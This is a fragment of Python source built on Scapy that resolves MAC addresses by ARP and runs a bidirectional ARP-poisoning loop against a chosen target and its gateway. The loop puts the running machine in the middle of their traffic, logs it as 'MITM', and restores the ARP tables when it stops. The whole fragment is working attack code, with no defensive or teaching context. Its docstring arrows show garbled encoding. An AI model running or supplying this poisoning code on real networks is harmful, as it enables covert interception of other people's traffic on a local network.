def _get_mac(ip: str) -> str:
    """ARP request to resolve IP в†’ MAC."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     iface=IFACE, timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return ""


def _arp_poison_loop(target_ip, target_mac, gw_ip, gw_mac, stop_ev, interval=1.5):
    """
    ARP poison both directions:
      target в†ђ (gw_ip is-at our_mac)
      gateway в†ђ (target_ip is-at our_mac)
    """
    our_mac = conf.iface.mac if hasattr(conf.iface, "mac") else ""
    try:
        # Try getting our MAC from interface
        out = subprocess.check_output(
            ["ip", "link", "show", IFACE], text=True)
        m = re.search(r"link/\w+ ([0-9a-f:]{17})", out)
        if m: our_mac = m.group(1)
    except Exception:
        pass

    pkt_to_target = (Ether(dst=target_mac) /
                     ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=gw_ip, hwsrc=our_mac))
    pkt_to_gw     = (Ether(dst=gw_mac) /
                     ARP(op=2, pdst=gw_ip, hwdst=gw_mac,
                         psrc=target_ip, hwsrc=our_mac))

    while not stop_ev.is_set():
        try:
            sendp([pkt_to_target, pkt_to_gw],
                  iface=IFACE, verbose=False, count=1)
        except Exception:
            pass
        time.sleep(interval)

    # Restore ARP tables on stop
    restore_target = (Ether(dst=target_mac) /
                      ARP(op=2, pdst=target_ip, hwdst=target_mac,
                          psrc=gw_ip, hwsrc=gw_mac))
    restore_gw     = (Ether(dst=gw_mac) /
                      ARP(op=2, pdst=gw_ip, hwdst=gw_mac,
                          psrc=target_ip, hwsrc=target_mac))
    sendp([restore_target, restore_gw] * 5,
          iface=IFACE, verbose=False)
    console.log(f"[cyan][MITM] ARP tables restored for {target_ip}[/]")


